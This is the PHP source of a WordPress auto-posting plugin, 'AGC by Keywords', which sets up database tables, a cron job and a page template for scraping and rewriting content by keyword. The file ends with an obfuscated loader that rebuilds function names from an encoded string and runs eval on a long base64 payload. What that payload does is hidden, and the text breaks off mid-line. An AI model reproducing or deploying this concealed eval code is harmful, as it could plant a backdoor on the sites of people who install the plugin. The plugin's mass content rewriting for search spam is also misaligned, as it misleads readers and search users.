<?php
/*
Plugin Name: AGC by Keywords
Plugin URI: https://infinity.agcscript.cyou/
Description: Full Rewrite and Auto Post by Keywords
Author: AGC SCRIPT
Version: 1.4
Author URI: https://www.facebook.com/AGCscript/
*/

add_action('admin_menu', 'agc_autopost_admin');
function agc_autopost_admin(){
    add_menu_page(
        'AGC AutoPost',
        'AGC AutoPost',
        'manage_options',
        'agcautopost',
        'agc_autopost_init',
        'dashicons-image-filter',
        '2'
    );
}
function agc_autopost_init(){
    include('agc_autopost.php');
}

function agc_autopost_sett() {
    global $wpdb;
    $DB_agc_sett = $wpdb->prefix.'agcautopost_sett';
    if($wpdb->get_var("SHOW TABLES LIKE '$DB_agc_sett';") != $DB_agc_sett) {
        $charset_collate = $wpdb->get_charset_collate();
   		$sql = "CREATE TABLE $DB_agc_sett (
		`id` int(11) NOT NULL AUTO_INCREMENT,
		`post_status` varchar(50) NOT NULL,
		`end_lang` varchar(10) NOT NULL,
		`tot_lang` varchar(10) NOT NULL,
		`word_post` varchar(10) NOT NULL,
		`status_cron` varchar(10) NOT NULL,
		`autosave_key` varchar(10) NOT NULL,
		`char_key` varchar(10) NOT NULL,
		`time_post` varchar(10) NOT NULL,
		`competitors_key` varchar(10) NOT NULL,
		`idkey` varchar(50) NOT NULL,
		PRIMARY KEY (`id`)
		) $charset_collate;";
    require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
    dbDelta($sql);
   }
   $wpdb->query( $wpdb->prepare( "INSERT IGNORE INTO $DB_agc_sett (id, post_status, end_lang, tot_lang, word_post, status_cron, autosave_key, char_key, time_post, competitors_key, idkey) VALUES ( %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s )", array('1', 'publish', 'id_ID', '4', '1500', 'off', 'off', '5', '600', 'on', '') ));
}
register_activation_hook(__FILE__,'agc_autopost_sett');

function agc_autopost_key() {
    global $wpdb;
    $DB_agc_key = $wpdb->prefix.'agcautopost_key';
    if($wpdb->get_var("SHOW TABLES LIKE '$DB_agc_key';") != $DB_agc_key) {
        $charset_collate = $wpdb->get_charset_collate();
   		$sql = "CREATE TABLE $DB_agc_key (
		`id` int(11) NOT NULL AUTO_INCREMENT,
		`idmd5` varchar(50) CHARACTER SET latin1 NOT NULL,
		`title` text COLLATE utf8mb4_unicode_ci NOT NULL,
		`slug` text COLLATE utf8mb4_unicode_ci NOT NULL,
		`category` varchar(10) NOT NULL,
		`target_uv` varchar(10) NOT NULL,
		`status` varchar(10) NOT NULL,
		PRIMARY KEY (`id`),
		UNIQUE KEY `idmd5` (`idmd5`)
		) $charset_collate;";
    require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
    dbDelta($sql);
   }
}
register_activation_hook(__FILE__,'agc_autopost_key');

add_filter( 'cron_schedules', 'cron_aap' );
function cron_aap( $schedules ) {
    global $wpdb;
    $DB_agc_sett = $wpdb->prefix.'agcautopost_sett';
    $sett_sql = $wpdb->get_results("SELECT * FROM  $DB_agc_sett WHERE id = '1'");
    foreach($sett_sql as $datasett){
        $timepost = $datasett->time_post;
        $statuscron = $datasett->status_cron;
    }
    if(preg_match('/^on$/', $statuscron)){
        $cnminute = $timepost / 60;
        $schedules['cron_agcautopost'] = array(
                'interval'  => $timepost,
                'display'   => __( 'Scrape AGC AutoPost '.$cnminute.' Minutes', 'textdomain' )
        );
    }
    return $schedules;
}
if ( ! wp_next_scheduled( 'cron_aap' ) ) {
    wp_schedule_event( time(), 'cron_agcautopost', 'cron_aap' );
}
add_action("init", "clear_cron_aap");
function clear_cron_aap() {
    global $wpdb;
    $DB_agc_sett = $wpdb->prefix.'agcautopost_sett';
    $sett_sql = $wpdb->get_results("SELECT * FROM  $DB_agc_sett WHERE id = '1'");
    foreach($sett_sql as $datasett){
        $statuscron = $datasett->status_cron;
    }
    if(preg_match('/^off$/', $statuscron)){
        wp_clear_scheduled_hook('cron_aap');
    }
}
add_action( 'cron_aap', 'cron_aap_func' );
function cron_aap_func() {
    include(plugin_dir_path(__FILE__).'___cron_aap_func.php');
}

add_filter('theme_page_templates', 'tes_idx');
add_filter('template_include', 'tes_idx_include', 99);
function tes_idx($templates){
    $templates[plugin_dir_path(__FILE__) . 'TES_index.php'] = __('Plugin AutoPost Single Keywords', 'single_autopost');
    return $templates;
}
function tes_idx_include($template){
    if (is_page('single_autopost')) {
        $meta = get_post_meta(get_the_ID());
        if (!empty($meta['_wp_page_template'][0]) && $meta['_wp_page_template'][0] != $template) {
            $template = $meta['_wp_page_template'][0];
        }
    }
    return $template;
}
function page_single_autopost() {
    $pagez = array(
        'post_title' => 'Plugin AutoPost Single Keywords',
        'post_content' => 'Jangan Di Edit',
        'post_name' => 'single_autopost',
        'post_status' => 'private',
        'post_author' => 1,
        'post_type' => 'page',
        'post_slug' => 'single_autopost',
        'page_template' => WP_PLUGIN_DIR . '/agc-by-keywords/TES_index.php'
    );
    if(get_page_by_path('single_autopost', OBJECT) == NULL){
        wp_insert_post( $pagez, $wp_error = false );
    }else{
        return false;
    }
}
register_activation_hook(__FILE__, 'page_single_autopost');

$bs_en="JTZFMSU3QSU2MiUyRiU2RCU2MTUlNUMlNzYlNzQwJTY5MjglMkQlNzAlNzglNzUlNzElNzklMkE2JTZDJTcyJTZCJTY0JTY3OSU1RiU2NSU2OCU2MyU3MyU3NyU2RjQlMkIlNjYzNyU2QQ";
$bs_de=base64_decode($bs_en);
$ur_de=urldecode($bs_de);
$O00OO0=$ur_de;
$O00O0O=$O00OO0[3].$O00OO0[6].$O00OO0[33].$O00OO0[30];
$O0OO00=$O00OO0[33].$O00OO0[10].$O00OO0[24].$O00OO0[10].$O00OO0[24];
$OO0O00=$O0OO00[0].$O00OO0[18].$O00OO0[3].$O0OO00[0].$O0OO00[1].$O00OO0[24];
$OO0000=$O00OO0[7].$O00OO0[13];
$O00O0O.=$O00OO0[22].$O00OO0[36].$O00OO0[29].$O00OO0[26].$O00OO0[30].$O00OO0[32].$O00OO0[35].$O00OO0[26].$O00OO0[30];
eval($O00O0O("JE8wTzAwMD0ieGFtdW5MZU1pQUtqYnlvVENEV3JHc3dGWU5JUHRIcWxVY2dKRVN2QmZoa1J6VlFaWE9wZHhyYUlaQXlnS29RY0pUbkNsSGl2cUxPV2VQTk1kelloamtSc21mYkZ0U1ZVdUdwRHdFQlhNSDlwZldvUURaR0llM1VCSjI0UmUzRzB3Mmh1WDI5VERsUlZKMnhWazNVVHJpNVpBbG9WWDI5VER6UFREd1Uxa2E1aERsaDdsS29STmxvVmthRzBYYVdMTkgwUnN6UDBrYWhJRHVMUU5sb1JObFV1WHpzQkpha1JNZkZPa2FHWnczc2hrcXhTZTJqbnNUOG5NdU85d1dnTFFmUi9NR3hDUWY4WkFsb1pObGtMTmxVYkpxVXVYenNCSmFrQkVPblJObG9Sc3pQMGthaElEVG85TnpQMGtoOVREd0ZMZWlQaFFsc2tKS05MTmxOUk5LT1JzelAwa2FoSURUVjdsS29STmxvVmV3c1Rld1ZSTWZGaHl6RkxKMlVoUWxOUk5LT1JzelAwa2FoSURUVjdsS29STmxGQkRLb25lMjkxSlpwbnNxV1RrYVc1UUNPOXN6WGJrYVV1a2FHMFh3c0lEaXBCTnpMUU5sb1JObG9STmxvVmthRzBYYVdMTkgwUnN6UDBrYWhJRHVMUU5sb1JOejFoSnpQaHlPblJObG9STmxvUk5xV1RrYVc1dzNQT0pxaGNEZlJWZXdzVGV3VkxObFUzSjNzVmszc2hYekdUSmFHVlFDTFFObG9STmxvUk5sb1ZrYUcwWGFXTE5IMFJyaTFPSnE5VkRmUktObE5MTmxVU2tac1N5ZlY3bEtvUk5sRjlsS29STmxGVER3VTFrYTRSc3pzaFh6RFNKSExRdHBuUWUyeFNrM2dScGlYY2ozRkJKWlVTeW9CN2xLb1JObEZPWGlzTHJpZ1JEWkdJZTNVQkoyNFJrenNiZTJHdWtUUlZYcUc0WGxWUU5sb1JOekxRTmxvUk5sb1JObEZURHdVMWthNFJrenNoRDE5VER3RkxlaVBodzJQU0pxeEtlaVB2UW9uUk5sb1JObG9STmxvUk5sb1pBMXg3UWxSbk11NUp3aHg3d3oxWFFUaDhRSDlmUWZWWU1UaGt0Zjk0c1RPUU5sb1JObG9STmxvUk5sb1Jld3NUZXdWbnN6VW5yd2dMTmxYVER3RkxlaVBoc1RWTGxLb1JObG9STmxvUk5sb1JObFUwRHdTMGxLb1JObG9STmxvUlFDTFFObG9STnowUU5sb1JOekYxZWF4QmVURmFYaTVjWHFoYkpLRlREd0ZMZWlQaFFsVTBEd1MwUXBuUk5sb1J5T25STmxvUk5sb1JObFUwRHdTME5IMFJzelVucndnZE1aRlRKMlBoazNnbnN6VWh5elVKZ0cwQkVPblJObG9STmxvUk5sVU9ld3Mwa1RvOU5xRzRrcXhiRHFqbnMzT1pBbG9WWHFHNFhsVjdsS29STmxvUk5sb1JrYUcwWHdzSU5sVU9ld3MwazFkU2tac1N5RzlUZWk1VlFsVU9ld3Mwa1RoWEVPblJObG9SdHBCOWxSQmFYaTVjWHFoYkpLRjVYVzljWHdzTFFsVXZEd1ZCeU9uUk5sb1JzekdUSmxvOU5sWG5YelVPa3VuYkEzWDNYVDU1SjNHMFhpc2hBYVBiSmY5VER3UDFKelV1TTNQaGV3c2NyVzl4WGlHVHlDMFpBWkdUSnFHSWUyOVZEZlJWcjJHNVFmNFpzYVNMTWlHSUFHR0NzdUxRTmxvUk5sVWh5ekZ0WHdzTE5IMFJEd1NPSnE5VkRmUlpBVGtMTmxVMWthT0JFT25STmxvUnN6c2hEYWVSTWZvWnJ6VTBremc2QVQ4WkFLVWh5ekZ0WHdzTGl1c1hBS2tic3VMUU5sb1JObFVia3pVQkoyNXVOSDBSZXdzVGV3Vm5sS29STmxvUk5sb1JwMUdmQ205cEdXOWZVR1VHalY1ampWV0VqMERXaktvOU1LRjBrWkdoQW9uUk5sb1JObG9STm1QR2pWeE1qV1V0Zm1HRlVtR2ZObG9STmxvUk5sb1JNQzRSRGFXTGsyakxsS29STmxvUk5sb1JwMUdmQ205cEdXOXFDMHhnQzFYZ0MwUEZHbWhNQ0tvOU1LRjBrWkdoQW9uUk5sb1JObG9STm1QR2pWeE1qV1V0VWo1SEMwVXNDVmtSTmxvUk5sb1JNQzRSTktOTGxLb1JObG9STmxvUnAxR2ZDbTlwR1c5R2owR2ZwalhXQ2hwUk5sb1JObG85TUtvS0NpOTZyaXhMZWY4MUFjb1JRV1hCSmFVYlgzZ1JDaHBSUEs0eFFmRkZrekZMREdYaGVWZEJYbDgxZ3VrSWd1ZVJRbWROR20xZ0FsRkxyaWRoTm1YaGUyZGJRZkZIcnpzYkppamJQQ1ZJZ2w0dWdIa3hBY214UGZGQ2VpRFNrYVZiUENnM0FjZzJOS09RTmxvUk5sb1JObEZIR0dzZ0MxRmp3MXNXVVZHZlVHTlJObG9STmxvUk5IMCtObFVURGlEYUFvblJObG9STmxvUk5tUEdqVnhNaldVdHBHR2pDMXNXVVZHZlVHTlJObG9STUM0Ulh6czFEZk9RTmxvUk5sb1JObEZIR0dzZ0MxRmp3MFBNQ1Y1V3AxVWpmajFXQzFHak5IMCtOSGpMbEtvUk5sb1JObG9ScDFHZkNtOXBHVzlqZmoxV0MxR2pObG9STmxvUk5sbzlNS28xQW9uUk5sb1JObG9STm1QR2pWeE1qV1V0Q2pXZWpWR21mR3NDTmxvUk5sb1JNQzRSZ0tPUU5sb1JObG9STmxGSEdHc2dDMUZqdzFQQ0NXOWlVR3NzVWhocFVqR2ZOSDArTnFEU0p6UGhsS29STmxvQkVPblJObG9Sc3FQbk5IMFJlM0dUSlc5QkphaDBRbG9WWHdzTE5sVjdsS29STmxGY1h3c0x3M1BoWHE5T1hXOVNrWnNTeWZSUnNxUG5BbG9WSjNGMHJpOUlrVG9CRU9uUk5sb1JzenNoazNHTFhsbzlOcVAxa2F4dER3U2hlVFJSc3FQbk5sVjdsS29STmxGT2thR1p3MjFTWHFQbncyV0xKbFJaQTF4N05aREJEcUdiamFHSURxR1REd05LRWh4N05aREJEcUdiZmlwS0VLTm5BS24vUWZOYnNUT1JzenNoazNHTFhsT1JzcXhCazNVNVhxTkJFT25STmxvUnN6aDByaVV1TkgwUnNxeEJrM1U1WHFzSmdHMUpnVzA3bEtvUk5sRkJES1NjWHdzTHcyR1RrYTViUWxVY3JsVkJ5T25STmxvUk5sb1JObFU1WHFoVmtUbzlObGtaRU9uUk5sb1J0cG5STmxvUmthRzBYd3NJTmxVNVhxaFZrdUxRTmxvUk5xUDFrYXh0ZTJ4Ymsyam5ObFVjcmxvQkVPQjlsUkJhWGk1Y1hxaGJKS0Z1a3FoSVhxVzR3MlBiSlpVaEpacG5ObFVjSjI1MERpNTBObFZSeU9uUk5sb1JEMnhiZWFXTE5sVTNrcVVLRU9uUk5sb1JzbVVsdzJXWmUxOXVEd1UwTkgwUnN6WE9EcU5kTVpGVERpREJ5bDRaZWlYY2V3RzBKM0ZiazNVdGsyRzBYbGs3bEtvUk5sb1ZrMkcwWFc5dWtpT1JNZm9WWDNGVmVLMCtEMkcwdzNzaGszR0xYemduTmhQV0NtR0hHbG9ZTm1EZkMwMFJObFVtcGg5U0QyUHRrMkcwWGxGd2ZtR2ZVZkZCRGxvOU5sa3hzVE5CRU9uUk5sb1JEYTlURGlXY3JsUlZrMkcwWFc5dWtpT1Jld2dSc3FVU1hxV3VEd1UwUXdMUU5sb1JObG9STmxvVmszRkJKWlVTeXpGYmszcFJNZm9WRHFXMGV3UGhYenBkTVpQT3JpNTBld1N0a3E5dVhITFFObG9STnowUU5sb1JObFVZazE5dWtxaElOSDBSclpQYkpoOVZEaVBiRHFqbnN6UE9yaTUwZXdTT0ozUDBBbEZqamhHV1FDTFFObG9STmxVdWtXOU9rYUdhTkgwUnNxQnV3M1BPcmk1SnMyVVNYcW1ad0dMWmt6c2hEYWg0czEwN2xLb1JObG9WazNGdGszR2FES285TmxVWWsxOXVrcWhJaVRYVmV3VVNzMTFKczNQMURhREJ5bFhYRU9uUk5sb1JsS29STmxvVnJ3UHRYelVMTkgwUkQyRzB3M1VuREc5MHJ3VUxEZlJCRU9uUk5sb1JzcWh1dzJXMVhsbzlOcVhoWFc5MHJxR3Rld0cwcnE5VFFsVjdsS29STmxvVnJ3UHRlMlcwTkgwUkQyRzB3M1VuREc5Y2V3VWhEMjlUeWZSVnJpcEJpdUZYQUM1SWVpMWhFT25STmxvUnNxaHV3M0dUSmxvOU5xU2JKaUd0WHdzTFFxV1ZEVzl4WGlHVHlHOVNrYWtuQ2hHZ0NsT1JDaEdnQ2xWQkVPblJObG9Sc3FodXcyU2JKZm85TnFTYkppR3RYd3NMUWxWN2xLb1JObG9RTmxvUk5sVVNrWnNDcFRvOU5xV1RrYVc1UWxOOGkzVUJYcXhod0M0S0FsTjhpMlcxWHFTYmtoMCtOS09LTVdkY2V3VWhEMjlUeUcwK05LT0tNV2RMcmk1dmtxOXVYVzArTktPS01XZExyaTV2cnE5ZERHMCtOS1Y3bEtvUk5sb1Zld3NUVVdwUk1mRlNrWnNTeWZSVnJ3UHRYelVMQWxvVnJ3UHRld0cwQWxvVnJ3UHRlMlcwQWxvVnJ3UHRYd3NMQWxvVnJ3UHRycTlkUUNMUU5sb1JOb25STmxvUnNxaGFrenNoREtvOU56UDBraDlURHdGTGVpUGhRbFVTa1pzQ3BUT1JzcVdUa1ZVakFsb1ZrM0Z0a3pzaERLVjdsS29STmxvVnJpRHVYaURhTkgwUmszVVR3M3Noa3F4U2Uyam5zcVdUa2hQSEFsb1Zld3NUVVdwTE5sVXVrVzl1WGlEYVFDTFFsS29STmxvVmVpWGNrM0ZCSlpVU3lsbzlOcTVoWFRGRkQyUENrcWhJWHFXNFFsVjdsS29STmxvVmt6c2hEYWg0ZXdzY05IMFJzcVdaZTNQT3JpNTBld1JkTVpGVEoyUGhrM2duc3FoYWt6c2hES1Y3bEtvUk5sb1ZrM0dhRGFoNGV3c2NOSDBSc3FXWmUzUE9yaTUwZXdSZE1aRlRKMlBoazNnbnNxaGFrM0dhREtWN2xLb1JObG9RTmxvUk5xaGFRbFdoSndGMHlmUlZrM0Z0a3pzaERLVlJzS2VSTmlHZGt6VTVRbFV1a1c5dVhpRGFRZmg3bEtvUk5sb1JObG9Sc3FQMWszVWJKRzljSjI1MERpNTBOSDBSc3V4T01La0lzekZURGlEQnlxV1RlVDRaTWw5T01La0lzcVBiSlpVaEpacElzdXhPTUtrSXN6UDFEYURCeXFXVGVUNFpNbDlPTUtrN2xLb1JObEY5RGl4dURpaGFRbFdoSndGMHlmUlZrM0Z0a3pzaERLVlJzS2VSRGkxT1h6Vm5zelBPdzNQMURhZUJRd0xRTmxvUk5sb1JObG9WZTNHdVhxOWR3MlBiSlpVaEpacFJNZm9aTXpvK3NUNFZrenNoRGFoNGV3c2NBS2s4QTNvK3NUNFZlMjlJWHFHSVhITFFObG9STnoxaEp6UGhyaWVuRGkxT1h6Vm5zelBPdzNGVERpZUJObGVhTmxXaEp3RjB5ZlJWazNGdGszR2FES1ZCeU9uUk5sb1JObG9STmxVY1h3UDBKMjF0ZTI5SVhxR0lYbG85TmxVY0oyNTBEaTUwQUtrOGtINFpBS1V1WGlEYXJ3U1NrYWdJc3VPYmtINFpFT25STmxvUnRpR0xrMkc3bEtvUk5sb1JObG9Sc3FQMWszVWJKRzljSjI1MERpNTBOSDBSc3FQYkpaVWhKWnA3bEtvUk5sRjlsS29STmxGVER3VTFrYTRSc3FQMWszVWJKRzljSjI1MERpNTBFT0I5bGFXVkRXOWFyaXgwRHdObk5sWDBycUd0ZTI5SVhxR0lYbGtMTmxYdWtxaElYcVc0dzJQYkpaVWhKWnBaTmxWN2xSQmFYaTVjWHFoYkpLRk9rYUdhcndTdHJpNXVEd3MwdzNoMFFsVWNKMjUwRGk1MFF3TFFObG9STnFYTEoyc1NKbG9WWDNGVmVjTFFObG9STmxVbXBoOVNEMlB0azJHMFhsbzlObFUza3FVS0FDNU9rYUdhcndSSXMyV1plMlcxWHE5T0ozUDB3M1BoWHpwWkVPblJObG9Sc3pQaFh6VXRrM1dMTkgwUnN6WE9EcU5kTWFYaFhXOVREd1AxSnpVdVFsc0NVanhXcDFwUlFLRnFqVjlQTmxvVlVtc3RlaVhjdzNQaFh6cFJHMFNXalZqUnJpcFJNZm9aZ2ZrS1FDTFFObG9STnFEYmthR1NlMlJuc3pQaFh6VXRrM1dMTnFXdU5sVVZld1VTazJHMFhsaDdsS29STmxvUk5sb1JzemhiWHdVMWVhR09KM1AwTkgwUnNxVVNYcVd1RHdVMEFDNTVKM0cwWGlzaHczRmJrM3A3bEtvUk5sRjlsS29STmxvVnJaUHR5d1UxZUtvOU5xQnVKMjV0RHFHY0oyVWhRbFU1SjNHMFhpc2hrcTl1WGxPUkdXc0dVZlY3bEtvUk5sb1Z5d1V0azNVU1hsbzlObFVZazE5NVh6R0tpVFhWZXdVU3MxMUpzM1AwZXdVMWtUWFhFT25STmxvUnN6aDB3M0ZiazJWUk1mb1ZyWlB0eXdVMWVoTFpEcVcwZWZYWGlUWE9KM1BCazJWWndDTFFObG9STmxVNVhXOW5EaWhaTkgwUnNxQnV3M2gwWGlzSnMyVVNYcW1ad0dMWnJxR0JEMlMwczEwN2xLb1JObG9RTmxvUk5sVUJrMTkwWHFPUk1mRlpEd1V0WHFTaHczVUJYcXhoUWxWN2xLb1JObG9RTmxvUk5xaGFRcWh1dzNQQkphWExEZlJCTmxlYU5sbVJyd1B0ZWlVZHJpNG5RZmg3bEtvUk5sb1JObG9SbEtvUk5sb1JObG9Scmllbmt6c2hEMTlkZXdVY3JsUlpBMTViSktwYnNUT1JzemgwdzNQMGV3cEJRd0xRTmxvUk5sb1JObG9STmxvUnN6aDBEcVcwZWZvOU56aDB3MlAxa2FPbnNxaHV3M1UwSmxWN2xLb1JObG9STmxvUnRpR0xrMkc3bEtvUk5sb1JObG9STmxvUk5sVTVYcVVTWHFtUk1mb1pzdUxRTmxvUk5sb1JObEY5bEtvUk5sb1JObG9Scmllbk5pR2RrelU1UWxVNVhxVVNYcW1CUXdMUU5sb1JObG9STmxvUk5sb1JzemgwdzJQYkRxalJNZm9aTXFVQlhLRnVYemhMREMwS1hxRzRYbDFTSnFoWkpjQmNEaTUwRHdON0ppV1REMmhJQWlzYlh6VWJKQ254UHdGNEVUTitNcWhha2FXZERmRnVrYWc5Tks4YlgzWDNBWmhiWHdVMWVhakllMjlkQTJHZGVhR1ZBVGtJc3poMERxVzBlZjRaTktGdVh6aExEQzBLWDJoVlhxUjZnQ29Pc2ZvU3JpMU9KM3MwZWk1MEUyU2hyaVhuWEhuWkFLVTVYVzluRGloWkFLWE95bG9TcmkxT0ozczBlaTUwRVROK01sOUJEWnNTSmlqK01sOVZyd2Urc3VMUU5sb1JObG9STmxGOURpeHVEd0xRTmxvUk5sb1JObG9STmxvUnN6aDB3MlBiRHFqUk1mb1pzdUxRTmxvUk5sb1JObEY5bEtvUk5sb1JObG9Sa2FHMFh3c0lOemgwdzNGU2thV1prYVdPcmxSVnl3VXRlMjlWRGZPUnN6aDB3M0ZiazJWTE5sVWNKMjUwRGk1MFFDTFFObG9STnowUU5sb1JOb25STmxvUmthRzBYd3NJTmxVY0oyNTBEaTUwRU9COWxhV1ZEVzlhcml4MER3Tm5ObFgwcnFHdGUyOUlYcUdJWGxrTE5sWE9rYUdhcndTdHJpNXVEd3MwdzNoMHNUb0JFT25RRFpHSWUzVUJKMjRSeXdVdGtxV1RlaVhUZXdGblFsVUJKWlBoa1pVQkoyNExObFVPSjNQQmsyVkxObFVjSjI1MERpNTBRd0xRTmxvUk5sVWNKcTl1cmk1Wnczb1JNZm9aTWw5T01LazdsS29STmxvVmtxV1RlaVhUZXdGbmtUbzlOcUc0a3F4YkRxam5ObFVjSnE5dXJpNVp3M29MTmxVY0oyNTBEaTUwTmxWN2xLb1JObG9Wa3FXVGVpWFRld0ZudzJoVk5IMFJrYTkxSmFwbmUyOTFKWnBuc3pGU2thV1prYVdPcnpnQk5sOFJzekZiazJodXJmVjdsS29STmxGYUozc2hlaVBuUWxVT2V3c1NEM3NTa3FTdU5xV3VObFVCSmFVaHlsbzlNS29Wa3FXVGVpWFRld0ZuUXdMUU5sb1JObG9STmxGQkRLUzBrYWhkUWxVT2V3c1NEM3NTa3FSQlF3TFFObG9STmxvUk5sb1JObG9Sc3pGU2thV1prYVdPcnpQSnNxaElEcUc0d2ZvSU1mb1ZlMnhiazJoSUQxOU9FT25STmxvUk5sb1JOejBRTmxvUk5sb1JObEZCREtSVmtxV1RlaVhUZXdGbncyaFZOSDA5TmxVQkphVWh5bG92TkhtQnlPblJObG9STmxvUk5sb1JObG9Wa3FXVGVpWFRld0ZuazFMVnJpNVZEd1NYTmw0OU5sVUJKWlBoa1pVQkoyNDdsS29STmxvUk5sb1J0cG5STmxvUnRwblJrYUcwWHdzSU5xaGRrcXhiRHFqbnNUa0xObFVPZXdzU0Qzc1NrcVN1UUNMUXRwblFlaVVWdzJXY1hxaGJKS1JaWDNGdHJxR1NEbGtMTnFEMUphUDByaTlJUWxoN2xLb1JObEZaSnE5S2VpT1JzelhPRHFON2xLb1JObG9WazJoMER3R1RKbG85TmxTQmszUGhYbFJWdzFQV2poRFdqaExaZldVampXZ1p3ZlZSc0tlUnNXOUNVR3NpVUdzSnMwU2pHV0ZDczEwUk1DMDlObFhiSktrUk1Ub0tyelUwa3pnS05IblJOYVMwWHpvS1Fmb0lObE42QVQ4S0FLVXRqMEdmR1ZHZmlUWE5HV1VwdzBTTWoxcFp3ZjRLQVRON2xLb1JObG9WZTNHVGtaR1RKbG85TmxTQmszUGhYbFJWdzFQV2poRFdqaExaZldVampXZ1p3ZlZSc0tlUnNXOUNVR3NpVUdzSnMwU2pHV0ZDczEwUk1DMDlObFhiSktrUk1Ub0tyelUwa3pnS05IblJOYVMwWHpvS1Fmb0lObE42QVQ4S0FLVXRqMEdmR1ZHZmlUWE5HV1VwdzBTTWoxcFp3ZjRWdzFQV2poRFdqaExaalZHVUdqR0NHVzlHalZWWndDTFFObG9STmxVaHl6RjFrYU9STmxvUk5IMFJEd1NPSnE5VkRmUlpBVGtMTmxVdXJ3VWhYd3NMUUNMUU5sb1JObFVjSjNGNXJxOXVYbG9STkgwUmszVVRYcTkxa3pGaGtLUlZEd1NPWHdzTGl1c1hRQ0xRTmxvUk5sVWh5ekZjSjNGNU5sb1JOSDBSRHdTT0pxOVZEZlJaQUtrTE5sVWNKM0Y1cnE5dVhsVjdsS29STmxvVmszR0tKcTlaa1RvUk5sbzlOelAwa1pVYlh3Rk9Ed05uc3FHNGtxUGJremhKZ1cwQkVPblJObG9Sc3ExMHczVUJYcXhoTkgwUkQyRzB3M1VuREc5MHJ3VUxEZlJCRU9uUk5sb1JzelAxZWF4YkQzZ1JNZkZaRHdVdFhxU2h3MlcxWHFTYmtLUkJFT25STmxvUnNxMTB3MmhkZWlYaE5IMFJEMkcwdzNVbkRHOU9KM1AwdzNVblhpMUtKYVdCSlc5MWthT25RQ0xRTmxvUk5xaGFRcUdka3pVNVFsVWRYVzlCSmlXWkRmVkJ5T25STmxvUk5sb1JObFVkWFc5QkppV1pEZm85TmxYblh6VU9rdW5iQTNVdURDbUlKaTBJZWFoSURUNUlEd3BiWHFSL2tDMFpBWkdUSnFHSWUyOVZEZlJWSndVdFhxaDBKcWpCRU9uUk5sb1J0cG5STmxvUnNxMTB3MlVoazJnUk1mRmNYd1V0cndQM0ozc1ZRelAwa2FoT3czVVNEM2duRDJHMHczVW5ERzljSjI1MERpNTBRbFVPSjNQMEFDNXNVbFZCQWxvMGdsVjdsS29STmxvVmsyZDFyaXBSTWZGT2thR1p3M3Noa3F4U2Uyam5zVDlrVWw4WkFsb1pzVE9SSmlwMVFsVWRYVzkwcndVTERmVkJFT25STmxvUnNxOUlER2hoZXdzTUpLbzlOcVVTWHFqbnMxVmRKZjFWc1R4dVh6czBKM1VCSmlqbkRxVzBEZlJLaWYxZEFpcEtBbEZkcjNVQkppam5RZlZSQUtvS05sTFJndWUxTnFVU3lmTkJRQ0xRTmxvUk5sVVlrMlBuSmltUk1mb1pNbG1kQWZGZnBHVXNDVmtSajBQTlVqMUZObVd6cDNQY2thaE9YbEZwSnpHWnJpNXVObDBkTVJuUk5sb1JNelBja2FoT1hsRjB5d0ZoTWZzU2t6RkxyaVBTWHFoYkpLOUxEbGRZazI5SU5jNTdOVkZjSjI1MER3UzBOY25STmFTMFh6RnVFSzhiazJQbkRpMVNBYTlURFQ4S0Fsb0twelU1a3FqS0VLb0tqenNiRHpHY1hsTkxObHNJZWkxaE5jblJOS2tJc3ExMHczVUJYcXhoQUtrS0Fsb0tyaTFTRDJqS0VLb0tzVDRWSndVdHJpMVNEMmpJc1ROTE5sc1ZEd1Bja2FoT1hxaGJKS042TmxOWkFLVWRYVzlWRHdQY0FLa0tBbG9LazJkMU5jblJOVldXQWZrSXN6UHZYaWhWQUtrS0Fsb0tKd0ZJTmNuUk5WMXBzVDRWazJkMXJpcElzMFdXTktPUk5hc1RlaTVWTmNuUnlUb0twelU1a3FqS0VLb0twWnNTSmFwS0Fsb0tKYVdkRGZONk5sTlpBS1VjSjNGNXJxOXVYbDRaTktGOUFsb0trYUcycmlHM05jblJ5VG9LcHpVNWtxaktFS29LamFHMnJpRzNOS09STlpzaFhhaGhYMXNTWHFoSURUTjZOekxSTlZGMHl3RmhOY25STmhzU1hxaElEVE5MTmxzVGV3VUJKYVhpZWl4MURmTjZObE4wQUtrSWthV0lEbFJ4QUhWQkFLa0tBbG9LZWFHdVhXc1NYcWhJRFRONk5sTjFOS0Y5QWxvS2V3RzBycTlUTmNuUnlUb0twelU1a3FqS0VLb0tqcUdUazI5SU5LT1JOYTVTSmlqS0VLb0tzVDRWazNHS0pxOVprVDRaTktGOU56MExObHNTRDJYVERpWFNYcUdmZXdVQkpha0tFS0Y3Tmxzb1h6aE9EZk42TmxzRkQyWFREaVhTWHFHZmV3VUJKYWtLQWxvS2thVzByaTVaR2FXTFhpaktFS29LUGw0WkFac1NKYXBuZ2ZPNVFmNFpOS09STlpzU1hxaElEMFBiWGk1ME5jblJOS2tJa2FXSURsUnVndWpPQUhOdWdjajVRZjRaTktGOUFsb0tKMkRhRHdzdU5jblJ5VG9LcHpVNWtxaktFS29LQzJEYUR3TktBbG9LWHdzTE5jblJOS2tJc3FQMWtaczFrYU9Jc1ROTE5sc0xKM1hwa2FoY0RmTjZObE5aQVpzU0phcG5nQ21MUENvQkFLa0lnSG9LQWxvS3JxaFpyV0ZUcmlQaE5jblJOS2tJa2FXSURsUjFnZk81RWZWSXNUNE9nbE5MTmxzT2thaGNEalAxa1pzaEphUDVOY25STmhHQ1VsTkxObHNPa2FoY0RmTjZObE5aQVpzU0phcG5ndW9MZ0NvT1FmNFpBY29PTktPUk5aRlRyaVBoR2FXTHJpVUdKWlVCSmxONk5sTlpBS1ViSmFHRERpV1RDMjRJc1ROTE5sc0JYcUdkcDI5SURxaDByaTlJTmNuUk5hUzBYekZ1RUs4YmsyUG5EaTFTQWE5VERUOUdrMkdWcDI5SURxaDByaTlJTktPUk5hVzJlaWhMZWlzQkpxaDB5Zk42Tmxzblh6VU9rdW5iQTNQY3JxR2RlZjVia2FrYmZpNUNYcTljclRzOXRDT2JrMlBUcndGME1SblJObG9Sc3VMUU5sb1JObDhicmllbnJ3UHRrMmhJRDJ4aFFsVlJzS2VSTmZGQmsxOVNEcTFCSktSQlF3TFFObG9STmxvUk5sRmhlMlNiTmxVWWsyUG5KaW03bEtvUk5sb2JBMzBRdGZWN2xjOCsiO2V2YWwoJz8+Jy4kTzAwTzBPKCRPME9PMDAoJE9PME8wMCgkTzBPMDAwLCRPTzAwMDAqMiksJE9PME8wMCgkTzBPMDAwLCRPTzAwMDAsJE9